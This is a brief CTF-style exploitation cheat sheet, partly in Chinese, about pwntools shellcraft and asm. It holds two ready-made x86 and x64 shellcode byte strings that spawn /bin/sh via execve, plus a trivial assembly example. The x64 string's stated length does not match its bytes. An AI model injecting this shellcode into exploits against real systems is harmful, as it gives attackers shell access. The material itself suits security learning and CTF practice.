# shellcraft/orw
https://docs.pwntools.com/en/stable/shellcraft.html
常用 cat/read/open/write

# 一定要用 b'' 或 encode('latin')。否则flat时会用 utf格式编码字符就不对了
```sh
# https://github.com/yyanyi213/pwn/blob/master/shellcode
# len -- 21
shellcode_x86 = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
# len -- 24
shellcode_x64 = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```


# asm

```python
from pwn import asm
assembly_code = """
    ret
"""
shellcode = asm(assembly_code)
print(shellcode)
```
